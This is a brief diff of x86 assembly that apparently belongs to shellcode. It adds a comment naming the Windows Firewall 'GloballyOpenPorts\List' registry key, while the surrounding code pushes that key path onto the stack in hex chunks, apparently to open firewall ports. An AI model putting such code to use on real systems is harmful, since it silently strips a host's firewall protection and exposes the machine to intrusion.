@@ -11,6 +11,7 @@ mov dword [edi], edx
 sub esp, 0x10       ;avoid handle being overwritten
  
 ;Prepare the key
+; SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\Firewallpolicy\StandardProfile\GloballyOpenPorts\List
 push 0x00747369
 push 0x4c5c7374
 push 0x726f506e
